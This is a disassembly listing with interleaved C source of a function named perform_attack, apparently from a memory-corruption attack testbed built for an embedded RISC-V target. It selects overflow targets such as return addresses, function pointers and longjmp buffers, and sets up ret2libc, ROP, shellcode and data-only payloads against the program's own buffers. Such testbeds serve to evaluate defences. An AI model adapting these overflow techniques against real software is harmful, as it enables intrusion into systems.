80001608:	800097b7          	lui	a5,0x80009
8000160c:	3dc78793          	addi	a5,a5,988 # 800093dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800093dd>
80001610:	94f42423          	sw	a5,-1720(s0)
            bss_flag = 0;
80001614:	800097b7          	lui	a5,0x80009
80001618:	0007ae23          	sw	zero,28(a5) # 8000901c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000901d>
            bss_mem_ptr_aux = &dummy_function;
8000161c:	800017b7          	lui	a5,0x80001
80001620:	b1e78793          	addi	a5,a5,-1250 # 80000b1e <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b1f>
80001624:	80009737          	lui	a4,0x80009
80001628:	00f72c23          	sw	a5,24(a4) # 80009018 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009019>
            bss_mem_ptr     = &dummy_function;
8000162c:	80009737          	lui	a4,0x80009
80001630:	00f72a23          	sw	a5,20(a4) # 80009014 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009015>
            if (attack.inject_param == DATA_ONLY) {
80001634:	800097b7          	lui	a5,0x80009
80001638:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
8000163c:	43d8                	lw	a4,4(a5)
8000163e:	0cb00793          	li	a5,203
80001642:	00f70c63          	beq	a4,a5,8000165a <perform_attack+0x366>
            heap_func_ptr = (void *) heap_buffer1;
80001646:	92942223          	sw	s1,-1756(s0)
8000164a:	bdb1                	j	800014a6 <perform_attack+0x1b2>
                buffer = bss_struct.buffer;
8000164c:	800097b7          	lui	a5,0x80009
80001650:	2b878793          	addi	a5,a5,696 # 800092b8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800092b9>
80001654:	94f42423          	sw	a5,-1720(s0)
                break;
80001658:	b5b9                	j	800014a6 <perform_attack+0x1b2>
                bss_mem_ptr = &bss_flag;
8000165a:	80009737          	lui	a4,0x80009
8000165e:	800097b7          	lui	a5,0x80009
80001662:	01c78793          	addi	a5,a5,28 # 8000901c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000901d>
80001666:	00f72a23          	sw	a5,20(a4) # 80009014 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009015>
            heap_func_ptr = (void *) heap_buffer1;
8000166a:	92942223          	sw	s1,-1756(s0)
8000166e:	bd25                	j	800014a6 <perform_attack+0x1b2>
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
80001670:	90a42c23          	sw	a0,-1768(s0)
80001674:	93242023          	sw	s2,-1760(s0)
                heap_mem_ptr = heap_flag;
80001678:	91342623          	sw	s3,-1780(s0)
8000167c:	b52d                	j	800014a6 <perform_attack+0x1b2>
            switch (attack.code_ptr) {
8000167e:	800097b7          	lui	a5,0x80009
80001682:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001686:	479c                	lw	a5,8(a5)
80001688:	ed478793          	addi	a5,a5,-300
8000168c:	4745                	li	a4,17
8000168e:	e4f760e3          	bltu	a4,a5,800014ce <perform_attack+0x1da>
80001692:	078a                	slli	a5,a5,0x2
80001694:	80007737          	lui	a4,0x80007
80001698:	66c70713          	addi	a4,a4,1644 # 8000766c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000766d>
8000169c:	97ba                	add	a5,a5,a4
8000169e:	439c                	lw	a5,0(a5)
800016a0:	8782                	jr	a5
                    target_addr = RET_ADDR_PTR;
800016a2:	ffc40793          	addi	a5,s0,-4
800016a6:	92f42023          	sw	a5,-1760(s0)
                    break;
800016aa:	b515                	j	800014ce <perform_attack+0x1da>
                    target_addr = &stack_func_ptr_param;
800016ac:	92c40793          	addi	a5,s0,-1748
800016b0:	92f42023          	sw	a5,-1760(s0)
                    break;
800016b4:	bd29                	j	800014ce <perform_attack+0x1da>
                    target_addr = heap_func_ptr;
800016b6:	92442783          	lw	a5,-1756(s0)
800016ba:	92f42023          	sw	a5,-1760(s0)
                    break;
800016be:	bd01                	j	800014ce <perform_attack+0x1da>
                    target_addr = &bss_func_ptr;
800016c0:	800097b7          	lui	a5,0x80009
800016c4:	01078793          	addi	a5,a5,16 # 80009010 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009011>
800016c8:	92f42023          	sw	a5,-1760(s0)
                    break;
800016cc:	b509                	j	800014ce <perform_attack+0x1da>
                    target_addr = &data_func_ptr;
800016ce:	8000c7b7          	lui	a5,0x8000c
800016d2:	fe878793          	addi	a5,a5,-24 # 8000bfe8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bfe9>
800016d6:	92f42023          	sw	a5,-1760(s0)
                    break;
800016da:	bbd5                	j	800014ce <perform_attack+0x1da>
                    target_addr = stack_jmp_buffer;
800016dc:	a7840793          	addi	a5,s0,-1416
800016e0:	92f42023          	sw	a5,-1760(s0)
                    break;
800016e4:	b3ed                	j	800014ce <perform_attack+0x1da>
                    target_addr = stack_jmp_buffer_param;
800016e6:	92842783          	lw	a5,-1752(s0)
800016ea:	92f42023          	sw	a5,-1760(s0)
                    break;
800016ee:	b3c5                	j	800014ce <perform_attack+0x1da>
                    target_addr = (void *) heap_jmp_buffer;
800016f0:	91842783          	lw	a5,-1768(s0)
800016f4:	92f42023          	sw	a5,-1760(s0)
                    break;
800016f8:	bbd9                	j	800014ce <perform_attack+0x1da>
                    target_addr = data_jmp_buffer;
800016fa:	8000c7b7          	lui	a5,0x8000c
800016fe:	95878793          	addi	a5,a5,-1704 # 8000b958 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b959>
80001702:	92f42023          	sw	a5,-1760(s0)
                    break;
80001706:	b3e1                	j	800014ce <perform_attack+0x1da>
                    target_addr = bss_jmp_buffer;
80001708:	800097b7          	lui	a5,0x80009
8000170c:	06878793          	addi	a5,a5,104 # 80009068 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009069>
80001710:	92f42023          	sw	a5,-1760(s0)
                    break;
80001714:	bb6d                	j	800014ce <perform_attack+0x1da>
                    target_addr = &stack_struct.func_ptr;
80001716:	a7440793          	addi	a5,s0,-1420
8000171a:	92f42023          	sw	a5,-1760(s0)
                    break;
8000171e:	bb45                	j	800014ce <perform_attack+0x1da>
                    target_addr = (void *) heap_struct + 256;
80001720:	91c42783          	lw	a5,-1764(s0)
80001724:	10078793          	addi	a5,a5,256
80001728:	92f42023          	sw	a5,-1760(s0)
                    break;
8000172c:	b34d                	j	800014ce <perform_attack+0x1da>
                    target_addr = &data_struct.func_ptr;
8000172e:	8000c7b7          	lui	a5,0x8000c
80001732:	ea878793          	addi	a5,a5,-344 # 8000bea8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bea9>
80001736:	92f42023          	sw	a5,-1760(s0)
                    break;
8000173a:	bb51                	j	800014ce <perform_attack+0x1da>
                    target_addr = &bss_struct.func_ptr;
8000173c:	800097b7          	lui	a5,0x80009
80001740:	3b878793          	addi	a5,a5,952 # 800093b8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800093b9>
80001744:	92f42023          	sw	a5,-1760(s0)
                    break;
80001748:	b359                	j	800014ce <perform_attack+0x1da>
                    switch (attack.location) {
8000174a:	800097b7          	lui	a5,0x80009
8000174e:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001752:	47dc                	lw	a5,12(a5)
80001754:	19200713          	li	a4,402
80001758:	0ce78b63          	beq	a5,a4,8000182e <perform_attack+0x53a>
8000175c:	00f76d63          	bltu	a4,a5,80001776 <perform_attack+0x482>
80001760:	19000713          	li	a4,400
80001764:	0ce78c63          	beq	a5,a4,8000183c <perform_attack+0x548>
80001768:	19100713          	li	a4,401
8000176c:	d6e791e3          	bne	a5,a4,800014ce <perform_attack+0x1da>
                            target_addr = heap_flag;
80001770:	93342023          	sw	s3,-1760(s0)
80001774:	bba9                	j	800014ce <perform_attack+0x1da>
80001776:	19300713          	li	a4,403
8000177a:	d4e79ae3          	bne	a5,a4,800014ce <perform_attack+0x1da>
                            target_addr = &data_flag;
8000177e:	8000c7b7          	lui	a5,0x8000c
80001782:	fec78793          	addi	a5,a5,-20 # 8000bfec <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bfed>
80001786:	92f42023          	sw	a5,-1760(s0)
8000178a:	b391                	j	800014ce <perform_attack+0x1da>
                    switch (attack.location) {
8000178c:	800097b7          	lui	a5,0x80009
80001790:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001794:	47dc                	lw	a5,12(a5)
80001796:	19200713          	li	a4,402
8000179a:	0ae78663          	beq	a5,a4,80001846 <perform_attack+0x552>
8000179e:	00f76b63          	bltu	a4,a5,800017b4 <perform_attack+0x4c0>
800017a2:	19000713          	li	a4,400
800017a6:	d2e794e3          	bne	a5,a4,800014ce <perform_attack+0x1da>
                            target_addr = &stack_secret;
800017aa:	bbc40793          	addi	a5,s0,-1092
800017ae:	92f42023          	sw	a5,-1760(s0)
800017b2:	bb31                	j	800014ce <perform_attack+0x1da>
800017b4:	19300713          	li	a4,403
800017b8:	d0e79be3          	bne	a5,a4,800014ce <perform_attack+0x1da>
                            target_addr = &data_secret;
800017bc:	8000c7b7          	lui	a5,0x8000c
800017c0:	c8878793          	addi	a5,a5,-888 # 8000bc88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bc89>
800017c4:	92f42023          	sw	a5,-1760(s0)
800017c8:	b319                	j	800014ce <perform_attack+0x1da>
            switch (attack.location) {
800017ca:	800097b7          	lui	a5,0x80009
800017ce:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800017d2:	47dc                	lw	a5,12(a5)
800017d4:	19200713          	li	a4,402
800017d8:	06e78e63          	beq	a5,a4,80001854 <perform_attack+0x560>
800017dc:	02f76363          	bltu	a4,a5,80001802 <perform_attack+0x50e>
800017e0:	19000713          	li	a4,400
800017e4:	08e78563          	beq	a5,a4,8000186e <perform_attack+0x57a>
800017e8:	19100713          	li	a4,401
800017ec:	cee791e3          	bne	a5,a4,800014ce <perform_attack+0x1da>
                    target_addr_aux = heap_mem_ptr_aux;
800017f0:	91042783          	lw	a5,-1776(s0)
800017f4:	90f42a23          	sw	a5,-1772(s0)
                    target_addr     = heap_mem_ptr;
800017f8:	90c42783          	lw	a5,-1780(s0)
800017fc:	92f42023          	sw	a5,-1760(s0)
                    break;
80001800:	b1f9                	j	800014ce <perform_attack+0x1da>
80001802:	19300713          	li	a4,403
80001806:	cce794e3          	bne	a5,a4,800014ce <perform_attack+0x1da>
                    target_addr_aux = &data_mem_ptr_aux;
8000180a:	8000c7b7          	lui	a5,0x8000c
8000180e:	b8878793          	addi	a5,a5,-1144 # 8000bb88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bb89>
80001812:	90f42a23          	sw	a5,-1772(s0)
                    target_addr     = &data_mem_ptr;
80001816:	8000c7b7          	lui	a5,0x8000c
8000181a:	a8878793          	addi	a5,a5,-1400 # 8000ba88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000ba89>
8000181e:	92f42023          	sw	a5,-1760(s0)
80001822:	b175                	j	800014ce <perform_attack+0x1da>
                    target_addr = &stack_func_ptr;
80001824:	93840793          	addi	a5,s0,-1736
80001828:	92f42023          	sw	a5,-1760(s0)
8000182c:	b14d                	j	800014ce <perform_attack+0x1da>
                            target_addr = &bss_flag;
8000182e:	800097b7          	lui	a5,0x80009
80001832:	01c78793          	addi	a5,a5,28 # 8000901c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000901d>
80001836:	92f42023          	sw	a5,-1760(s0)
8000183a:	b951                	j	800014ce <perform_attack+0x1da>
                            target_addr = &stack_flag;
8000183c:	94440793          	addi	a5,s0,-1724
80001840:	92f42023          	sw	a5,-1760(s0)
80001844:	b169                	j	800014ce <perform_attack+0x1da>
                            target_addr = &bss_secret;
80001846:	800097b7          	lui	a5,0x80009
8000184a:	3bc78793          	addi	a5,a5,956 # 800093bc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800093bd>
8000184e:	92f42023          	sw	a5,-1760(s0)
80001852:	b9b5                	j	800014ce <perform_attack+0x1da>
                    target_addr_aux = &bss_mem_ptr_aux;
80001854:	800097b7          	lui	a5,0x80009
80001858:	01878793          	addi	a5,a5,24 # 80009018 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009019>
8000185c:	90f42a23          	sw	a5,-1772(s0)
                    target_addr     = &bss_mem_ptr;
80001860:	800097b7          	lui	a5,0x80009
80001864:	01478793          	addi	a5,a5,20 # 80009014 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009015>
80001868:	92f42023          	sw	a5,-1760(s0)
8000186c:	b18d                	j	800014ce <perform_attack+0x1da>
                    target_addr_aux = &stack_mem_ptr_aux;
8000186e:	94040793          	addi	a5,s0,-1728
80001872:	90f42a23          	sw	a5,-1772(s0)
                    target_addr     = &stack_mem_ptr;
80001876:	93c40793          	addi	a5,s0,-1732
8000187a:	92f42023          	sw	a5,-1760(s0)
8000187e:	b981                	j	800014ce <perform_attack+0x1da>
            if (setjmp(stack_jmp_buffer) != 0) {
80001880:	a7840513          	addi	a0,s0,-1416
80001884:	f91fe0ef          	jal	ra,80000814 <setjmp>
80001888:	e511                	bnez	a0,80001894 <perform_attack+0x5a0>
            payload.jmp_buffer = &stack_jmp_buffer;
8000188a:	a7840793          	addi	a5,s0,-1416
8000188e:	94f42e23          	sw	a5,-1700(s0)
            break;
80001892:	a00d                	j	800018b4 <perform_attack+0x5c0>
                printf("Longjmp attack failed. Returning normally...\n");
80001894:	80007537          	lui	a0,0x80007
80001898:	4d850513          	addi	a0,a0,1240 # 800074d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800074d9>
8000189c:	335000ef          	jal	ra,800023d0 <printk>
800018a0:	a9c5                	j	80001d90 <perform_attack+0xa9c>
            if (setjmp(stack_jmp_buffer_param) != 0) {
800018a2:	92842503          	lw	a0,-1752(s0)
800018a6:	f6ffe0ef          	jal	ra,80000814 <setjmp>
800018aa:	e54d                	bnez	a0,80001954 <perform_attack+0x660>
            payload.jmp_buffer = &stack_jmp_buffer_param;
800018ac:	92840793          	addi	a5,s0,-1752
800018b0:	94f42e23          	sw	a5,-1700(s0)
    payload.ptr_to_correct_return_addr = RET_ADDR_PTR;
800018b4:	ffc40793          	addi	a5,s0,-4
800018b8:	96f42823          	sw	a5,-1680(s0)
    payload.inject_param = attack.inject_param;
800018bc:	800097b7          	lui	a5,0x80009
800018c0:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800018c4:	43d8                	lw	a4,4(a5)
800018c6:	94e42623          	sw	a4,-1716(s0)
    switch (attack.technique) {
800018ca:	439c                	lw	a5,0(a5)
800018cc:	06400693          	li	a3,100
800018d0:	10d78a63          	beq	a5,a3,800019e4 <perform_attack+0x6f0>
800018d4:	06500713          	li	a4,101
800018d8:	16e78b63          	beq	a5,a4,80001a4e <perform_attack+0x75a>
        fprintf(stderr, "target_addr == %p\n", target_addr);
800018dc:	92042483          	lw	s1,-1760(s0)
800018e0:	85a6                	mv	a1,s1
800018e2:	80007537          	lui	a0,0x80007
800018e6:	55050513          	addi	a0,a0,1360 # 80007550 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007551>
800018ea:	2e7000ef          	jal	ra,800023d0 <printk>
        fprintf(stderr, "buffer == %p\n", buffer);
800018ee:	94842583          	lw	a1,-1720(s0)
800018f2:	80007537          	lui	a0,0x80007
800018f6:	56450513          	addi	a0,a0,1380 # 80007564 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007565>
800018fa:	2d7000ef          	jal	ra,800023d0 <printk>
    if ((unsigned long) target_addr > (unsigned long) buffer) {
800018fe:	94842583          	lw	a1,-1720(s0)
80001902:	2295ff63          	bgeu	a1,s1,80001b40 <perform_attack+0x84c>
          - (unsigned long) buffer
80001906:	40b485b3          	sub	a1,s1,a1
          + 1); /* For null termination so that buffer can be     */
8000190a:	0595                	addi	a1,a1,5
        payload.size =
8000190c:	94b42823          	sw	a1,-1712(s0)
            fprintf(stderr, "payload size == %d\n", payload.size);
80001910:	80007537          	lui	a0,0x80007
80001914:	57450513          	addi	a0,a0,1396 # 80007574 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007575>
80001918:	2b9000ef          	jal	ra,800023d0 <printk>
    buffer[0] = '\0';
8000191c:	94842783          	lw	a5,-1720(s0)
80001920:	00078023          	sb	zero,0(a5)
    if (!build_payload(&payload)) {
80001924:	94c40513          	addi	a0,s0,-1716
80001928:	baeff0ef          	jal	ra,80000cd6 <build_payload>
8000192c:	22050363          	beqz	a0,80001b52 <perform_attack+0x85e>
    switch (attack.function) {
80001930:	800097b7          	lui	a5,0x80009
80001934:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001938:	4b9c                	lw	a5,16(a5)
8000193a:	e0c78793          	addi	a5,a5,-500
8000193e:	4721                	li	a4,8
80001940:	34f76563          	bltu	a4,a5,80001c8a <perform_attack+0x996>
80001944:	078a                	slli	a5,a5,0x2
80001946:	80007737          	lui	a4,0x80007
8000194a:	6b470713          	addi	a4,a4,1716 # 800076b4 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800076b5>
8000194e:	97ba                	add	a5,a5,a4
80001950:	439c                	lw	a5,0(a5)
80001952:	8782                	jr	a5
                printf("Longjmp attack failed. Returning normally...\n");
80001954:	80007537          	lui	a0,0x80007
80001958:	4d850513          	addi	a0,a0,1240 # 800074d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800074d9>
8000195c:	275000ef          	jal	ra,800023d0 <printk>
80001960:	b7b1                	j	800018ac <perform_attack+0x5b8>
            if (setjmp(*heap_jmp_buffer) != 0) {
80001962:	91842503          	lw	a0,-1768(s0)
80001966:	eaffe0ef          	jal	ra,80000814 <setjmp>
8000196a:	e901                	bnez	a0,8000197a <perform_attack+0x686>
            payload.jmp_buffer = (void *) heap_jmp_buffer;
8000196c:	91842783          	lw	a5,-1768(s0)
80001970:	94f42e23          	sw	a5,-1700(s0)
            payload.stack_jmp_buffer_param = NULL;
80001974:	96042023          	sw	zero,-1696(s0)
            break;
80001978:	bf35                	j	800018b4 <perform_attack+0x5c0>
                printf("Longjmp attack failed. Returning normally...\n");
8000197a:	80007537          	lui	a0,0x80007
8000197e:	4d850513          	addi	a0,a0,1240 # 800074d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800074d9>
80001982:	24f000ef          	jal	ra,800023d0 <printk>
80001986:	a129                	j	80001d90 <perform_attack+0xa9c>
            if (setjmp(data_jmp_buffer) != 0) {
80001988:	8000c537          	lui	a0,0x8000c
8000198c:	95850513          	addi	a0,a0,-1704 # 8000b958 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b959>
80001990:	e85fe0ef          	jal	ra,80000814 <setjmp>
80001994:	e911                	bnez	a0,800019a8 <perform_attack+0x6b4>
            payload.jmp_buffer = (void *) data_jmp_buffer;
80001996:	8000c7b7          	lui	a5,0x8000c
8000199a:	95878793          	addi	a5,a5,-1704 # 8000b958 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b959>
8000199e:	94f42e23          	sw	a5,-1700(s0)
            payload.stack_jmp_buffer_param = NULL;
800019a2:	96042023          	sw	zero,-1696(s0)
            break;
800019a6:	b739                	j	800018b4 <perform_attack+0x5c0>
                printf("Longjmp attack failed. Returning normally...\n");
800019a8:	80007537          	lui	a0,0x80007
800019ac:	4d850513          	addi	a0,a0,1240 # 800074d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800074d9>
800019b0:	221000ef          	jal	ra,800023d0 <printk>
800019b4:	aef1                	j	80001d90 <perform_attack+0xa9c>
            if (setjmp(bss_jmp_buffer) != 0) {
800019b6:	80009537          	lui	a0,0x80009
800019ba:	06850513          	addi	a0,a0,104 # 80009068 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009069>
800019be:	e57fe0ef          	jal	ra,80000814 <setjmp>
800019c2:	e911                	bnez	a0,800019d6 <perform_attack+0x6e2>
            payload.jmp_buffer = (void *) bss_jmp_buffer;
800019c4:	800097b7          	lui	a5,0x80009
800019c8:	06878793          	addi	a5,a5,104 # 80009068 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009069>
800019cc:	94f42e23          	sw	a5,-1700(s0)
            payload.stack_jmp_buffer_param = NULL;
800019d0:	96042023          	sw	zero,-1696(s0)
            break;
800019d4:	b5c5                	j	800018b4 <perform_attack+0x5c0>
                printf("Longjmp attack failed. Returning normally...\n");
800019d6:	80007537          	lui	a0,0x80007
800019da:	4d850513          	addi	a0,a0,1240 # 800074d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800074d9>
800019de:	1f3000ef          	jal	ra,800023d0 <printk>
800019e2:	a67d                	j	80001d90 <perform_attack+0xa9c>
            switch (attack.inject_param) {
800019e4:	0ca00793          	li	a5,202
800019e8:	02f70e63          	beq	a4,a5,80001a24 <perform_attack+0x730>
800019ec:	02e7e163          	bltu	a5,a4,80001a0e <perform_attack+0x71a>
800019f0:	0c800793          	li	a5,200
800019f4:	02f70f63          	beq	a4,a5,80001a32 <perform_attack+0x73e>
800019f8:	0c900793          	li	a5,201
800019fc:	04f71063          	bne	a4,a5,80001a3c <perform_attack+0x748>
                    payload.overflow_ptr = &ret2libc_target;
80001a00:	800017b7          	lui	a5,0x80001
80001a04:	b7878793          	addi	a5,a5,-1160 # 80000b78 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b79>
80001a08:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a0c:	bdc1                	j	800018dc <perform_attack+0x5e8>
80001a0e:	0cb00793          	li	a5,203
80001a12:	02f71563          	bne	a4,a5,80001a3c <perform_attack+0x748>
                    payload.overflow_ptr = 0xdeadbeef;
80001a16:	deadc7b7          	lui	a5,0xdeadc
80001a1a:	eef78793          	addi	a5,a5,-273 # deadbeef <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xdeadbef0>
80001a1e:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a22:	bd6d                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = (uintptr_t) &rop_target;
80001a24:	800017b7          	lui	a5,0x80001
80001a28:	b9a78793          	addi	a5,a5,-1126 # 80000b9a <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b9b>
80001a2c:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a30:	b575                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = buffer;
80001a32:	94842783          	lw	a5,-1720(s0)
80001a36:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a3a:	b54d                	j	800018dc <perform_attack+0x5e8>
                        fprintf(stderr, "Unknown choice of attack code");
80001a3c:	80007537          	lui	a0,0x80007
80001a40:	50850513          	addi	a0,a0,1288 # 80007508 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007509>
80001a44:	18d000ef          	jal	ra,800023d0 <printk>
                        exit(1);
80001a48:	4505                	li	a0,1
80001a4a:	013040ef          	jal	ra,8000625c <exit>
            switch (attack.code_ptr) {
80001a4e:	800097b7          	lui	a5,0x80009
80001a52:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001a56:	479c                	lw	a5,8(a5)
80001a58:	ed478793          	addi	a5,a5,-300
80001a5c:	4745                	li	a4,17
80001a5e:	0cf76863          	bltu	a4,a5,80001b2e <perform_attack+0x83a>
80001a62:	078a                	slli	a5,a5,0x2
80001a64:	80007737          	lui	a4,0x80007
80001a68:	6d870713          	addi	a4,a4,1752 # 800076d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800076d9>
80001a6c:	97ba                	add	a5,a5,a4
80001a6e:	439c                	lw	a5,0(a5)
80001a70:	8782                	jr	a5
                    payload.overflow_ptr = RET_ADDR_PTR;
80001a72:	ffc40793          	addi	a5,s0,-4
80001a76:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a7a:	b58d                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &stack_func_ptr;
80001a7c:	93840793          	addi	a5,s0,-1736
80001a80:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a84:	bda1                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &stack_func_ptr_param;
80001a86:	92c40793          	addi	a5,s0,-1748
80001a8a:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a8e:	b5b9                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = heap_func_ptr;
80001a90:	92442783          	lw	a5,-1756(s0)
80001a94:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001a98:	b591                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &bss_func_ptr;
80001a9a:	800097b7          	lui	a5,0x80009
80001a9e:	01078793          	addi	a5,a5,16 # 80009010 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009011>
80001aa2:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001aa6:	bd1d                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &data_func_ptr;
80001aa8:	8000c7b7          	lui	a5,0x8000c
80001aac:	fe878793          	addi	a5,a5,-24 # 8000bfe8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bfe9>
80001ab0:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001ab4:	b525                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &stack_struct.func_ptr;
80001ab6:	a7440793          	addi	a5,s0,-1420
80001aba:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001abe:	bd39                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = (void *) heap_struct + 256;
80001ac0:	91c42783          	lw	a5,-1764(s0)
80001ac4:	10078793          	addi	a5,a5,256
80001ac8:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001acc:	bd01                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &data_struct.func_ptr;
80001ace:	8000c7b7          	lui	a5,0x8000c
80001ad2:	ea878793          	addi	a5,a5,-344 # 8000bea8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bea9>
80001ad6:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001ada:	b509                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &bss_struct.func_ptr;
80001adc:	800097b7          	lui	a5,0x80009
80001ae0:	3b878793          	addi	a5,a5,952 # 800093b8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800093b9>
80001ae4:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001ae8:	bbd5                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = stack_jmp_buffer;
80001aea:	a7840793          	addi	a5,s0,-1416
80001aee:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001af2:	b3ed                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = stack_jmp_buffer_param;
80001af4:	92842783          	lw	a5,-1752(s0)
80001af8:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001afc:	b3c5                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = *heap_jmp_buffer;
80001afe:	91842783          	lw	a5,-1768(s0)
80001b02:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001b06:	bbd9                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = data_jmp_buffer;
80001b08:	8000c7b7          	lui	a5,0x8000c
80001b0c:	95878793          	addi	a5,a5,-1704 # 8000b958 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b959>
80001b10:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001b14:	b3e1                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = bss_jmp_buffer;
80001b16:	800097b7          	lui	a5,0x80009
80001b1a:	06878793          	addi	a5,a5,104 # 80009068 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009069>
80001b1e:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001b22:	bb6d                	j	800018dc <perform_attack+0x5e8>
                    payload.overflow_ptr = &dop_dest;
80001b24:	81018793          	addi	a5,gp,-2032 # 8000bff8 <dop_dest>
80001b28:	94f42a23          	sw	a5,-1708(s0)
                    break;
80001b2c:	bb45                	j	800018dc <perform_attack+0x5e8>
                        fprintf(stderr,
80001b2e:	80007537          	lui	a0,0x80007
80001b32:	52850513          	addi	a0,a0,1320 # 80007528 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007529>
80001b36:	09b000ef          	jal	ra,800023d0 <printk>
                    exit(1);
80001b3a:	4505                	li	a0,1
80001b3c:	720040ef          	jal	ra,8000625c <exit>
            fprintf(stderr, "Error calculating size of payload\n");
80001b40:	80007537          	lui	a0,0x80007
80001b44:	58850513          	addi	a0,a0,1416 # 80007588 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007589>
80001b48:	089000ef          	jal	ra,800023d0 <printk>
        exit(1);
80001b4c:	4505                	li	a0,1
80001b4e:	70e040ef          	jal	ra,8000625c <exit>
